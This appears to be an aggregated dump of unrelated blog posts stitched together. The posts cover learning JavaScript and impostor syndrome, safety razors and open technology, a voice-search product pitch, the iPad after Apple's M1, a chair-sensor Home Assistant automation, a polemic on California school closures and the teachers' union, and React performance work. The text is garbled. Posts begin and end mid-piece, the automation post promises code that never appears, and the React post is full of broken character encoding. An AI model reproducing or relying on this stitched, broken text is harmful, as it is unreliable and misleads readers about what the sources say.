<p>Such a mindset only gave birth to my impostor syndrome. I thought that I don't deserve my current position, my salary, that I am a “fraud.” So I started to follow every popular developer on Twitter, read every technical news, and thousands of developer blogs just to convince myself that I deserve what I have and to feel more close to the title “great developer.”</p>
<p><strong>This was not a healthy behavior.</strong></p>
<p>But it helped me to discover that a lot of people I followed (I thought were 10X engineers) actually didn’t know a lot of things. They may know how to do some complex things that require a lot of different deep knowledge in a couple of fields and at the same time don’t know some primitive things. Like to know how to design highly scalable database architectures but don’t know how vertical-align an element with CSS.</p>
<p>Big thanks to those developers, like Dan Abramov (creator of Redux) for <a target="_blank" href="https://overreacted.io/things-i-dont-know-as-of-2018/">this article</a>, they cured my imposter syndrome and showed me that it is okay not to know something.</p>
<h2 id="programming-is-not-hard-if-you-know-how-to-learn">Programming Is Not Hard If You Know How To Learn</h2>
<p>When I started to learn JavaScript, it was hard. <strong>Because I learned the wrong way.</strong></p>
<p>Read a lot of theory without the practice, no routine, no end goal. Chaos.</p>
<p>I thought it was normal to learn like this. Until I discovered <strong>deliberate practice.</strong></p>
<p>It’s a purposeful and systematic type of practice (learning).</p>
<p>The difference between normal practice and deliberate is that deliberate requires focused attention and is conducted with the specific goal of improving performance.</p>
<p>After I applied a deliberate practice, I began to notice how fast I'm progressing with learning JavaScript. My knowledge started to stick for a long time, not just for 5 minutes after tutorials. I created the end goal, why I am learning JavaScript, and understand what I need to learn, and what I don't.</p>
<p>📌 <em>Quick note: I’m creating a JavaScript course where I’m using deliberate practice to <strong>combine modern and practical JavaScript theory with a lot of real-world practice</strong> to teach you how to become a skilled JavaScript developer with knowledge of modern language features. <a target="_blank" href="https://javascriptcoursethatworks.com/">Join here.</a></em></p>
<p>So here is what you need to perform deliberate practice on your own:</p>
<ol>
<li><strong>Teacher:</strong> provides practice activities designed to help you improve performance.</li>
<li><strong>Perform at maximum effort:</strong> constantly being taken out of your comfort zone.</li>
<li><strong>Well defined and specific goals:</strong> not just “overall improvement.”</li>
<li><strong>To be in focus:</strong> give your full attention, no distractions.</li>
<li><strong>Do conscious actions:</strong> no autopilot.</li>
<li><strong>Instant response to feedback and modifying your strategy.</strong></li>
</ol>
<p>When you start learning a new language, technology, framework, whatever, stick to these rules to get big results as quickly as possible.</p>
<h2 id="there-is-no-best-programming-language">There is no “best programming language”</h2>
<p>There is no <strong>best "something"</strong> in our world. Only <strong>best in something</strong>.</p>
<p>Let’s take cars. How can we choose the best car in the world? By speed? By safety? By what criteria?</p>
<p>It’s impossible.</p>
<p>We can only choose the best car in a certain category. Like the safest car. Or the best offroad car.</p>
<p>And if we look deeper, every category solves some problems.</p>
<p>For example.</p>
<p><strong>Problem:</strong> We have children and we take them to school every day, we want our children to be safe on the way to school.</p>
<p><strong>Solution:</strong> Buy the safest car.</p>
<p><strong>Problem:</strong> We go camping every weekend, so we need some vehicle that can easily get us to places that are difficult to access.</p>
<p><strong>Solution:</strong> Buy the best off-road car.</p>
<p>The same is with programming languages. Some languages and tools are better at solving some problems than others.</p>
<p>If we want to build an interactive website, we choose JavaScript.</p>
<p>If we want to go with ML/AI, we choose Python.</p>
<p>Remember, <strong>there is no best programming language, there is the best programming language to ...</strong></p>
<p>So start with a problem first, then pick a language to solve it.</p>
<h2 id="in-the-end">In the end...</h2>

November 26, 2020 | https://michel-slm.name/post/2020-11-23-on-safety-razors-and-tech/ | <a href="https://web.archive.org/web/*/https://michel-slm.name/post/2020-11-23-on-safety-razors-and-tech/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <p><img src="https://michel-slm.name/img/rex_ambassador.webp" alt="rex-ambassador"></p>
<h2 id="on-safety-razors">On safety razors</h2>
<p>I recently switched over from the ubiquitous cartridge razors to double-edge safety razors. The original impetus was not finding a non-charging base for my GiletteLabs Heated Razors - the battery in the stem made it too wide for most razor holders - and noticing that a lot of reviews swear by various safety razors.</p>
<p>I ended up buying the 
<a href="https://www.razoremporium.com/rex-supply-co-ambassador-adjustable-stainless-steel-de-razor/" target="_blank" rel="noopener">Rex Ambassador</a><sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup> a few months ago - and then held off on actually using it, telling myself I need to learn how to properly use it first. In the end I told myself I would stop using my Gilette the day after the US Presidential Election, and start using the safety razor the morning after the US Presidential Election is finally called – which was Sunday the 8th, with a nice 5-day stubble to test it on.</p>
<p>The first shave went surprisingly smoothly; the next few shaves ended with some minor mishaps - cockiness and distraction getting in the way - but overall there is no way I’m going back to cartridge razors after this. Feeling more in control, getting a closer shave, no plastic waste to dispose – and hey much lower total cost of ownership!</p>
<h2 id="-and-technology">… and technology</h2>
<p>There seems to be a parallel here between the world of personal care and that of technology:</p>
<ul>
<li>most people are trapped on proprietary, heavily marketed solutions (cartridge razors, proprietary operating systems, apps and services)</li>
<li>these proprietary solutions are at first glance more user friendly</li>
<li>the more open solutions have a steeper learning curve but are eventually more empowering</li>
<li>vendor lock-in</li>
<li>the incentives for the manufacturers/vendors and customers/users are not aligned</li>
</ul>
<p>Think Windows on one side, vs Linux (and the BSDs) on the other (with macOS initially being in the middle and increasingly swaying to becoming even more constraining than Windows). Think proprietary gaming consoles and mobile IAP-chasing games, vs game platforms that 
<a href="https://fennel-lang.org/setup#making-games-with-fennel" target="_blank" rel="noopener">encourage participation</a> like 
<a href="https://tic80.com/" target="_blank" rel="noopener">TIC-80</a> and 
<a href="https://love2d.org/" target="_blank" rel="noopener">LÖVE</a>. Think US-centric proprietary social networks (Facebook, Twitter) and services (Dropbox, Google Suite) vs distributed social networks (Mastodon, Pleroma, Diaspora etc.) and self-hosted services (Nextcloud, Cryptpad etc.).</p>
<p>What are most people sacrificing to the altar of promised convenience? Literally both time and money: our attention, higher costs; also our autonomy (you’re locked in) and our privacy (… so platform owners can mine your attention and monetize what they observe of your behavior).</p>
<p>If you believe in capitalism, this is bad news. If you don’t it’s even worse.</p>
<h2 id="so-what-can-we-do">So what can we do?</h2>
<p>Part of the solution is regulatory. In the EU, 
<a href="https://nextcloud.com/blog/eu-court-withdraw-personal-data-of-eu-citizens-from-us-cloud-services-immediately/" target="_blank" rel="noopener">a recent ECJ ruling</a> requires EU companies to stop using US-based cloud services to host data from EU citizens. This could help push the adoption of more open, user-empowering, privacy-friendly alternatives.</p>
<p>But in other jurisdictions like the US, regulation might be a long time coming, except maybe in California (plus the companies we’re trying to unshackle users from are mostly US-based). So a lot of the solution has to be bottom up.</p>
<p>We simply need to lower barriers to entry, both actual and perceived, to using the platforms we’re championing. Some involve compromises (e.g. 
<a href="https://flatpak.org/" target="_blank" rel="noopener">Flatpak</a> is a great way to abstract away the differences between Linux distributions, to the point that 
<a href="https://flathub.org/home" target="_blank" rel="noopener">it’s easier to install proprietary apps</a>, including Steam – which improves the availability of games on Linux despite, yes, being proprietary). Some involve corporate backing (e.g. 
<a href="https://fedoramagazine.org/lenovo-fedora-now-available/" target="_blank" rel="noopener">Fedora on Lenovo laptops</a>). A lot would involve being more welcoming to newcomers, and bridging the actual usability gaps there are.</p>
<p>It’s hard enough to overcome incumbency and the network effect. Let’s not make it harder for ourselves.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>Voice search or voice-enabled search is the means of searching by using the most natural input channel, human speech.</p><p><strong>TL;DR You can find a demo of voice search done right in the bottom of this article</strong></p><p><a href="https://www.thinkwithgoogle.com/marketing-strategies/app-and-mobile/voice-search-statistics/">20% of all Google App searches</a> are done by using voice and a nearly 40% of US internet users are using voice search features.</p><p>According to PwC research from 2018, consumers actually prefer voice over typing for searching. And this is no wonder: typing on a smart phone is not the nicest of tasks and more and more people are using internet primarily on a mobile device.</p><h2>Voice search is not available on most applications</h2><p>But when it comes to applications and websites, voice search is still rarely available. Why is that?</p><p>We did some small research on developer communities and found out that the <strong>number one reason for not adopting voice search</strong> is the lack of developer tools for doing that.</p><p>Search is a very valuable part of many applications and designers and developer teams use a lot of time to make it just right for the users. Users who search can be over three times more probable to convert than those who don't search.</p><blockquote><p>Developer tools for building voice search haven't previously been available</p></blockquote><p>This means getting users to search and most importantly to find what they are looking for is of immense value to any product team.</p><p>Smart speakers can help here: according to ComScore, half of online shoppers are using voice assistants to help them research products.</p><p>But like we've written many times, smart speakers and voice assistants are not the <a href="https://www.speechly.com/blog/why-smart-speakers-are-not-the-future-of-voice/">holy grail of voice</a>. Actually far from it. Voice needs to be a part of applications to be really relevant.</p><h2>Differences of voice search and traditional search</h2><p>Voice search is not just regular search box that has a microphone button and a speech-to-text system. This approach would lead into a bad user experience and this is not how Google is doing it, either.</p><p>In fact, the reason why a lot of searches on Google are done by using voice is that they have developed their natural language understanding capabilities. If you are looking for population of the USA, you can just ask "What's the population of United States" and you'll get your answer.</p><p>We search differently by using voice and by typing. For example, voice searches are typically longer than their written counterparts and they are expressed in natural language.</p><div><div><div><p>Sign up and learn how voice search can improve your key metrics</p></div></div></div><p>This has clear implications for voice search. While typing "Intel LGA1151 motherboards" to a search bar is a natural way for doing search by typing, uttering that out loud might prove difficult and probably saying something like "motherboards for new intel processors" might be a better way of expressing the same search by using voice.</p><p>While regular search can give valuable information on how the voice search should be implemented, it needs to be designed separately.</p><h2>How to do voice search right</h2><p>To get voice search right, it needs to support natural language. The experience must be natural and it should be as tightly integrated to the current user experience as possible. You don't want to add a voice assistant or a chatbot with a totally different user experience, but to complement your current search.</p><p>Speechly is the first developer tool that enables developers to add natural, real-time voice experience to their applications in a short amount of time.</p><p>Voice search done by using Speechly works on all platforms with a single configuration for consistent user experience, enables corrections by using speech and is easily integrated to the current user interface with minimal changes.</p><p>Here's a demo showing voice search done right. It supports natural language, long or short queries and updates in real-time to encourage user to go on with the voice experience or to enable them to correct themselves quickly.</p><h2>Voice search demo</h2><p>Speechly supports <a href="https://docs.speechly.com/client-libraries/ios/">iOS</a>, <a href="https://docs.speechly.com/client-libraries/android/">Android</a>, <a href="https://docs.speechly.com/client-libraries/react/">React</a> and <a href="https://docs.speechly.com/client-libraries/react-native/">React Native</a> platforms. You can find tutorials for each platform in our documentation.</p><p>If you are interested in adding voice search to your website or mobile application, <a href="https://www.speechly.com/get-started/">contact us</a> to learn more!</p></div></div></div></div>]]>

<p>Hear that? It’s the sound of Mac fans. No, not your shiny new M1 Mac’s fans—chances are, you’ll never hear those—but rather, the sound of <em>excitement</em> rippling through the Mac community. This is something big. Really big. Now, I’m only 33, but someday when I go full fuddy-duddy I will speak of this: the great Intel/Apple Silicon transition. The beginning of a new era at Apple.</p>



<p>All that sounds dramatic, of course, but it’s interesting to trace all of the different paths that led us to this point. The A-Series chips, the introduction of Metal, rapid machine learning gains, the gradually degrading repairability scores as components became more integrated, the Secure Enclave, a new super fast emulation layer, new unified memory architecture, and 5nm process… years and years of work have now come to fruition with the first Apple Silicon chips for Mac. And our minds are blown.</p>



<p>Suddenly, we’re handed a thin, entry-level fanless laptop that performs better than almost every other Mac computer out there, and a low-end MacBook Pro and Mac Mini that make current Mac Pro owners sweat and clutch their wheels. So many questions abound. What new hardware designs will these gains make possible? What on earth does Apple have in store for its high-end Macs? Will anyone else even be able to compete? It’s an exciting time to be a Mac lover, but, surprise: this post isn’t really about the Mac. It’s about the iPad.</p>



<p>There’s no question that Apple has struggled to craft a cohesive, compelling narrative for the iPad. For a long time, there seemed to be a distinct lack of product vision. Everyone likes to speculate over what role Steve Jobs ultimately intended the iPad to have in people’s lives, but not only is that pointless, it’s also irrelevant. We don’t need Steve to tell us what the iPad is good for. We know what it’s good for, and we can easily imagine what it <em>could</em> be good for, if only Apple would set it free.</p>



<p>Just as Apple left us with great expectations for its Pro Mac line-up, the latest iPad Air also raises the bar in new and interesting ways. The Air served as sort of an appetizer for the new M1 chips, while also receiving a generous trickle-down of features from the iPad Pro, including USB-C and support for the latest keyboard and Pencil accessories. There have been rumors of new mini-LED displays for the next-gen iPad Pros, but it’s going to take a lot more than new display tech to set the Pros apart.</p>



<p>Francisco Tolmasky (<a href="https://twitter.com/tolmasky/status/1330033394349125642?s=20">@tolmasky</a>) recently tweeted:</p>



<blockquote><p>“A sad but inescapable conclusion from the impressive launch of the M1 is just how much Apple squandered the potential of the iPad. The iPad has had amazing performance for awhile, so why is the M1 a game changer? Because it’s finally in a machine we can actually <em>do things on</em>.”</p></blockquote>



<p>Francisco is right: Power and performance aren’t the bottleneck for iPad, and haven’t been for some time. So if raw power isn’t enough, and new display tech isn’t enough, where does the iPad go from here? Will it be abandoned once more, lagging behind the Mac in terms of innovation, or will Apple continue to debut its latest tech in this form factor? Is it headed toward functional parity with the Mac or will it always be hamstrung by Apple’s strict App Store policies and seemingly inconsistent investment in iPadOS?</p>



<p>It’s clear that Apple <em>wants</em> the iPad Pro to be a device that a wide variety of professionals can use to get work done. And since so many people use web apps for their work, the introduction of “desktop” Safari for iPad was an important step toward that goal. The Magic Keyboard and trackpad was another step.</p>



<p>Here are ten more steps I believe Apple could and should take to help nudge the iPad into this exciting next era of computing.</p>



<ol><li>Give the iPad Pro another port. Two USB 4.0 ports would be lovely.</li><li>Adopt a landscape-first mindset. Rotate the Apple logo on the back and move the iPad’s front-facing camera on the side beneath the Apple Pencil charger to better reflect how most people actually use their iPad Pros.</li><li>Introduce Gatekeeper and app notarization for iOS. The process of side-loading apps should <em>not</em> be as simple as downloading them from the App Store. Bury it in Settings, make it slightly convoluted, whatever: just have an officially-sanctioned way of doing it.</li><li>Ruthlessly purge the App Store Guidelines of anything that prevents the iPad from serving as a development machine. Every kind of development from web to games should be possible on an iPad. And speaking of games—emulators should be allowed, too.</li><li>Release a suite of professional first-party apps at premium prices. If someone can edit 4K videos in Final Cut on their M1 MacBook Air, they should be able to edit 4K videos in Final Cut on their iPad Pro. I refuse to believe that these pro apps can’t be re-imagined and optimized for a touch experience. If Apple leads the way in developing premium software for iPad, others will follow.</li><li>Make it possible to write, release, and install plug-ins (if appropriate) for the aforementioned first party apps.</li><li>Bring App Library to the iPad and allow widgets to be positioned anywhere on the Home Screen. This isn’t groundbreaking, it just annoys the heck out of me.</li><li>Release a new keyboard + trackpad case accessory that allows the iPad to be used in tablet mode without removing it from the case.</li><li>Introduce Time Machine backups for iPadOS.</li><li>5G, ofc.</li></ol>



<p>In the end, fostering a vibrant community of iPad app developers can only stand to benefit the Mac (and vice-versa).</p>



<p>It’s simple: people love their iPads. They love them so much they wish they could do even more with them. The new M1 Macs should give iPad fans reason to be excited; now that we’ve seen hints of what future Macs can be, it’s time for the iPad to reassert itself—to remind us once again who it’s for, and what makes it special.</p>



<p>In other words: Your move, iPad.</p>

We tend to sit more and take less breaks than we would usually do in an office, and over time that takes a toll on our backs and necks. I thought I fixed this by buying a standing desk, but I was wrong. The problem is that I usually forget to raise the desk so I sit in my chair for more than an hour until I feel pain in my back, and that's when I remember that I should stand up. So how do I fix this? An alarm that would ring every hour would do just fine, but it's not very accurate. What if I'm not in the office? What if I'm working at night? Do I really want to spend time setting alarms? No!</p>
<p>I like to automate things so I found a solution for this as well. The only thing I had to do was to place a contact sensor under my chair, and each time I would sit down it would report its state to Home Assistant. From there on I could create whatever automation I wanted. In my case, after 50 minutes of sitting down, I'll have Alexa notify me that I must stand up, and insist every 5 minutes if I'm still sitting down. Here's how I did it.</p>
<h3 id="step-1-place-the-contact-sensor">Step 1: Place the contact sensor</h3>
<p>I found that when I sit on the chair, the seat will go down a bit, so I just need to find the perfect place for my contact sensor so that it will get close enough when I sit down. Also, I would like it to remain closed when I lean on my back, because that still counts as sitting down (and a bad position for my back). After a few trials I found the perfect position, here's how it looks for an Aeron chair.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1605726474455/QzkPW8PnI.png?auto=format&amp;q=60" alt="Contact sensor"></p>
<p>The small magnet can be glued on top of the chair using its original sticker and it will hold just fine. The best part is that you can hardly see them when you look from above, not that it would matter that much.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1605726513434/djOgkYFR8.png?auto=format&amp;q=60" alt="Aeron Chair"></p>
<h3 id="step-2-add-it-to-home-assistant">Step 2: Add it to Home Assistant</h3>
<p>This is where the fun begins. The first thing you have to do is to connect your sensor to Home Assistant, the way you do this depends on your hardware. In my case, I have a Conbee II so I have to pair my Zigbee sensor with it, then it will appear in Home Assistant as a Binary Sensor. I then created a template sensor just for fun. It has two states: "Sitting down" and "Standing up", here's how the code looks like:</p>
<p>I made a YouTube video where you can see how it works:</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
					
<p>In California, the nation’s most populous state, 90% of students started the school year entirely online. When schools closed in March, <a href="https://www.gov.ca.gov/2020/04/20/governor-newsom-announces-cross-sector-partnerships-to-support-distance-learning-and-bridge-the-digital-divide/" target="_blank" rel="noreferrer noopener">50% of low-income California students</a> lacked the necessary technology to access distance learning. Broader tech distribution was available for the 2020-21 school year thanks to donations from companies like HP, Lenovo, Amazon, Apple, T-Mobile, Microsoft, and Google. Twitter CEO Jack Dorsey even personally donated $10 million to the city of Oakland’s tech initiative. With chromebooks and wifi hotspots now available for every student, California legislators and corporations congratulated themselves on closing the “<a href="https://time.com/4718032/the-digital-divide/" target="_blank" rel="noreferrer noopener">digital divide</a>.”</p>



<p>Despite their improved tech access, many students have more pressing material needs. Over <a href="https://www.usich.gov/homelessness-statistics/ca/" target="_blank" rel="noreferrer noopener">260,000 California students</a> experience homelessness every year, and <a href="https://leginfo.legislature.ca.gov/faces/billTextClient.xhtml?bill_id=201920200SB298" target="_blank" rel="noreferrer noopener">over 20% of California children</a> live below the poverty line. The tech industry has not made massive donations to medical and therapy services, which low-income students often receive through community schools. Likewise, there is no private backing for the state’s free grab-and-go meals program.&nbsp;</p>



<div id="block_5f7a52ef09aad">
    <p>
		Distance learning is a sleight of hand. Framed as a panacea, online education is actually the vehicle for a long-desired economic restructuring.     </p>
</div>


<p>Online schooling will generate a treasure trove of data tech firms can buy and sell. Free meals will not. Silicon Valley boasts a yearly output of <a href="https://www.theguardian.com/technology/2019/apr/30/silicon-valley-wealth-second-richest-country-world-earth#:~:text=1%20year%20old-,If%20Silicon%20Valley%20were%20a%20country%2C%20it%20would,among%20the%20richest%20on%20Earth&amp;text=Were%20it%20real%2C%20the%20Sultanate,every%20nation%20on%20the%20planet" target="_blank" rel="noreferrer noopener">$275 billion</a> and has a GDP similar to that of Qatar. Yet California, the world’s fifth largest economy, is currently <a href="https://edsource.org/2020/guide-to-californias-budget-deferrals-pros-cons-and-costs-of-delayed-payments/634950#:~:text=Last%20year%2C%20the%20minimum%20level,spending%20to%20last%20year's%20level." target="_blank" rel="noreferrer noopener">withholding $11 billion</a> from schools. Districts have been given IOUs for state funding and will not be reimbursed until next year. In contrast, California billionaires increased their net worth by over <a href="https://health-access.org/wp-content/uploads/2020/06/Billionaires-Report-release-6.28.20_updated.docx.pdf" target="_blank" rel="noreferrer noopener">25.5%</a> ($175 billion) in the first three months of the pandemic.&nbsp;</p>



<p>Students throughout California are now stuck at home in hot, crowded rooms that occasionally fill with wildfire smoke. <a href="https://www.cde.ca.gov/ds/sd/cb/cefelfacts.asp#:~:text=Basic%20Facts%E2%80%94California%20Language%20Census%3A%20Fall%202019&amp;text=The%201%2C148%2C024%20English%20learners%20constitute,than%20English%20in%20their%20homes." target="_blank" rel="noreferrer noopener">19% of these students are English language learners</a> and <a href="https://www.cde.ca.gov/sp/se/sr/cefspeced.asp" target="_blank" rel="noreferrer noopener">almost 13% of them have disabilities</a>. Every day on Zoom they fall more and more behind both academically and socially. In Los Angeles Unified, the state’s largest district, students are receiving <a href="https://www.documentcloud.org/documents/7012859-LAUSD-UTLA-Distance-Learning-Tentative-Agreement.html#document/p12" target="_blank" rel="noreferrer noopener">90-170 minutes</a> of daily live instruction (depending on their age), after which they are expected to do independent work. Compared to the traditional six- or seven-hour school day, online education is laughably inadequate.</p>



<p>In real time, teachers and families are watching important developmental windows close for vulnerable children. Meanwhile the California Democratic Party and its affiliates tout <a href="https://www.youtube.com/watch?v=KZaXGMaeegM" target="_blank" rel="noreferrer noopener">virtual schooling as a solution</a> for mitigating COVID-19 transmission. This policy is the result of an alignment between the Democratic Party, corporate power, and a bureaucratic teachers’ union. The purpose of their alignment is to rationalize austerity and boost commercial profits. Distance learning is a sleight of hand. Framed as a panacea, online education is actually the vehicle for a long-desired economic restructuring.&nbsp;</p>



<h5><strong>School Closures: An Unscientific and Regressive Policy&nbsp;</strong></h5>







<p>California’s introduction of online schooling was driven by financial concerns, not medical or moral ones. Reopening safely would have required physical distancing plans, distribution of face shields or masks, sanitizing supplies, systems for daily health screenings, regular testing, widespread use of outdoor spaces, alternative schedules, smaller class sizes, and a massive hiring initiative. The primary reason these proposals were shot down was not rising COVID-19 cases as the governor, Gavin Newsom, asserted. California cases, hospitalizations, and deaths have been <a href="https://public.tableau.com/views/COVID-19CasesDashboard_15931020425010/Cases?:embed=y&amp;:showVizHome=no" target="_blank" rel="noreferrer noopener">declining since August 1</a>, but since then Newsom has only made <a href="https://www.cdph.ca.gov/Programs/CID/DCDC/Pages/COVID-19/COVID19CountyMonitoringOverview.aspx" target="_blank" rel="noreferrer noopener">reopening guidelines stricter</a>.&nbsp;</p>



<p>The full prohibition on in-person learning directly contradicts the advice of medical and scientific experts. In June the American Academy of Pediatrics (AAP) <a href="https://services.aap.org/en/pages/2019-novel-coronavirus-covid-19-infections/clinical-guidance/covid-19-planning-considerations-return-to-in-person-education-in-schools/" target="_blank" rel="noreferrer noopener">issued recommendations</a> for school re-openings, stating, “the AAP strongly advocates that all policy considerations for the coming school year should start with a goal of having students physically present in school.” The National Academies of Sciences, Engineering, and Medicine issued <a href="https://www.nationalacademies.org/news/2020/07/schools-should-prioritize-reopening-in-fall-2020-especially-for-grades-k-5-while-weighing-risks-and-benefits" target="_blank" rel="noreferrer noopener">similar guidance</a>. Schools, the authors argue, provide essential services to students and families.&nbsp;</p>



<p>Only <em>after</em> large school districts decided to stay closed did the AAP revise its original guidance to fit a perceived political consensus. Many clinical studies and reviews supported their original conclusion, demonstrating that children are <a href="https://pediatrics.aappublications.org/content/146/2/e2020004879" target="_blank" rel="noreferrer noopener">less likely to transmit COVID-19</a> than adults, and school closures are an <a href="https://www.thelancet.com/journals/lanchi/article/PIIS2352-4642(20)30095-X/fulltext#seccestitle20" target="_blank" rel="noreferrer noopener">ineffective method of disease control</a>. Not only will these irrational closures deepen class disparities, the policy has also overruled some children’s civil right to public education—a right that became universal in federal law less than 50 years ago.&nbsp;</p>



<p>It was not until 1975 that people with disabilities won a “Free and Appropriate Public Education” through the Individuals with Disabilities Education Act (IDEA). Before IDEA people with intellectual disabilities were often put in underfunded and abusive state schools, such as the infamous <a href="https://www.youtube.com/watch?v=bpVEjzO6Dd0" target="_blank" rel="noreferrer noopener">Willowbrook state school in Staten Island</a>. Similarly, discrimination against English language learners was allowed until the 1974 passage of the Equal Education Opportunity Act.&nbsp;</p>



<p>Dismantling these gains is apparently of no concern to the California Democrats and the California Teachers Association (CTA), the state teachers union. Virtual learning effectively limits educational access for high-need populations. Yet as public resources are funneled into online learning platforms, the CTA regularly claims to be <a href="https://californiaeducator.org/unionstrong/" target="_blank" rel="noreferrer noopener">fighting back against billionaires</a> and politicians. In reality, the teachers union is acting as an astroturfing and financing arm of the tech industry and the Democratic Party. There is no real conflict between these entities because their interests are identical.&nbsp;</p>



<h5><strong>The Teachers Union as Controlled Opposition</strong></h5>







<p>The wave of California teachers’ strikes in the 2018-19 school year may have left observers with the impression that the CTA is a robust union with a strong organizing focus. While recent changes in local and statewide leadership have sparked some collective actions, the union largely operates as a bureaucratic funding vehicle and promotion wing for the Democratic Party.&nbsp;</p>



<p>The median teacher salary in California is <a href="https://www.salary.com/research/salary/benchmark/public-school-teacher-salary/ca" target="_blank" rel="noreferrer noopener">$65,252</a>. On average, <a href="https://californiapolicycenter.org/allocation-of-teacher-union-dues-by-state/" target="_blank" rel="noreferrer noopener">California teachers pay $1,072</a> in dues, and the majority of dues do not go to local organizations—they go to the CTA. In 2018 at least twelve CTA officers and directors made <a href="https://projects.propublica.org/nonprofits/display_990/940362310/10_2019_prefixes_92-95%2F940362310_201808_990O_2019101616751101" target="_blank" rel="noreferrer noopener">six-figure salaries</a>. The CTA president took home about $340,000, and the union’s Associate Executive Director over $1 million. It is extremely difficult for teachers to find out how much of their dues money goes to political activities, let alone which of these activities actually help secure better working conditions and wages for teachers.&nbsp;</p>



<p>However, some information is available. California teachers’ dues directly contribute to the CTA’s PAC. Although teachers can opt out from donating to the PAC, this option is only given when they sign the form to join the union. While there are limits to the CTA’s donations to individual candidates through its PAC, the CTA can donate greater amounts through <a href="http://laschoolreport.com/antonucci-california-school-unions-are-ramping-up-campaign-spending/" target="_blank" rel="noreferrer noopener">independent expenditure committees</a>. For example, the CTA’s PAC donated only $29,000 to Newsom’s election campaign in 2018, but its independent expenditure committee gave $1 million to “Education Organizations for Gavin Newsom for Governor 2018.”&nbsp;&nbsp;</p>



<p>The National Education Association, which the CTA is a part of, is likewise opaque about how much dues money is used for political activities and what those activities are. In 2018 the <a href="https://www.opensecrets.org/orgs/summary?toprecipcycle=2020&amp;contribcycle=2020&amp;lobcycle=2020&amp;outspendcycle=2020&amp;id=d000000064&amp;topnumcycle=2018" target="_blank" rel="noreferrer noopener">NEA contributed about $5.4 million</a> to candidates and political campaigns and spent close to $2.9 million on lobbying. After endorsing Joe Biden in March, the NEA now invites teachers to become “<a href="https://educationvotes.nea.org/become-an-educator-for-joe/?ms=spsHP" target="_blank" rel="noreferrer noopener">Educators for Joe</a>” through its website.&nbsp;</p>



<p>The relationship between the union and the California Democratic Party extends to the CTA’s organizing work for ballot initiatives. Most recently, local California unions have asked their members to <a href="https://www.cta.org/press-release/800-educators-kickoff-signature-gathering-for-schools-and-communities-first-initiative" target="_blank" rel="noreferrer noopener">collect signatures</a> and join rallies for Prop 15, the Students and Communities First Initiative. The slogan for Prop 15 is “Tax the Rich,” but the tax will not be on wealthy individuals, or directly on the revenue of California’s largest industries (tech, agriculture, tourism, and entertainment). The tax will instead be on <a href="https://ballotpedia.org/California_Proposition_15,_Tax_on_Commercial_and_Industrial_Properties_for_Education_and_Local_Government_Funding_Initiative_(2020)" target="_blank" rel="noreferrer noopener">business properties</a> exceeding $3 million in value. The initiative is backed by national politicians like <a href="https://twitter.com/Schools1stCA/status/1296273352638828546" target="_blank" rel="noreferrer noopener">Elizabeth Warren</a>, <a href="https://news.ballotpedia.org/2019/07/29/bernie-sanders-endorses-2020-california-initiative-to-change-how-commercial-and-industrial-properties-are-taxed/" target="_blank" rel="noreferrer noopener">Bernie Sanders</a>, <a href="https://twitter.com/PeteButtigieg/status/1180299303694286849" target="_blank" rel="noreferrer noopener">Pete Buttigieg</a>, and <a href="https://www.kqed.org/news/11801979/bloomberg-endorses-measure-to-revise-prop-13-raise-commercial-property-taxes" target="_blank" rel="noreferrer noopener">Michael Bloomberg</a>. The Chan Zuckerberg foundation has contributed <a href="https://chanzuckerberg.com/newsroom/chan-zuckerberg-initiative-engages-on-key-california-ballot-measures/" target="_blank" rel="noreferrer noopener">over $6.3 million</a> to support Prop 15.&nbsp;</p>



<p>Union members should be concerned about the fact that, according to the <a href="https://www.cta.org/our-advocacy/scf/estimated-funding" target="_blank" rel="noreferrer noopener">CTA’s own Prop 15 calculator</a>, the plan will fund privately-operated charter schools in addition to public schools. Charter schools are property leasing schemes that exploit low-income communities for the <a href="https://www.washingtonpost.com/news/answer-sheet/wp/2014/06/04/why-hedge-funds-love-charter-schools/" target="_blank" rel="noreferrer noopener">benefit of investors</a>. In using public school teachers to organize for this funding, the CTA has promoted an initiative that will allow investment capital to benefit from industrial property taxes, an expense that <a href="https://calmatters.org/politics/post-it/2020/09/prop-15-small-business-taxes-california-split-roll-property/" target="_blank" rel="noreferrer noopener">some worry</a> will fall on small businesses in the form of increased rents. Given the level of mismanagement, cronyism, and anti-teacher animus plaguing the administrations of many California school districts, it is also worth wondering if Prop 15 money will go where it is truly needed (staffing), or whether it will be wasted on more tech products.&nbsp;</p>



<p>Ultimately, there is no real tension between the political project of the teachers union and that of the Democratic Party. Both are working toward the same outcomes. In the case of COVID-19, the desired outcome is the purchase of hardware, software, and online learning subscriptions on an enormous scale. This ploy relies on a politics of …</p></div></div>

<p>Although we know that React is pretty fast by default<em>â€”</em>with its DOM diffing mechanism able to perform efficient updates only to the necessary nodes<em>â€”</em>some of our customers have so many steps in a single scenario making even such efficient rendering feels slow.</p>
<p>Yet, as this scenario page remains central to our usersâ€™ day-to-day life, we have to find a way to speed up the rendering time. Although the focus of this article is on the React side, we also made some improvements on the backend side, which we will discuss  in this article as well.</p>
<h2>First Step: Have a baseline</h2>
<p>Before going even further, itâ€™s almost always necessary to have some baseline to compare. To do that, we can simply take notes of the page load time for example. We can take 10 hard reload, and calculate the average load time. In some cases, we measured the memory consumption as well. This simple step really doesnâ€™t take more than just a pen and paper to do.</p>
<h2>Optimizing Queries</h2>
<p>After establishing some baseline, we go stright at finding ways we can do to optimize our front-end application. We asked ourselves: why is the rendering so slow? There can be many reasons, and sometimes itâ€™s confusing where to look at first.</p>
<p>Fortunately, we have been using an App Performance Monitoring (APM) tools, such as New Relic and Scout APM, for quite awhile. This was a good starting point. By utilizing it, we were able to point out that we were frequently sending queries on a table having no index for the column we used for filtering. That resulted in a whole-table scan making executing the query considerably slower.</p>
<p>So the fix was simply by adding an index on those fields! Easy fix, easy gain. Right? Thanks to the APM tools.</p>
<p>But wait, shouldnâ€™t we always use the ID field, designated with primary key, for filtering out the data? Yes, but, there are cases where we donâ€™t want to use the primary key. For instance, letâ€™s imagine we allowed our admin to list scenarios belonging to any given <code>username</code> as it is easier to remember a username than an ID. Thus, the query for that request wonâ€™t use the tableâ€™s ID column, but the <code>username</code>.</p>
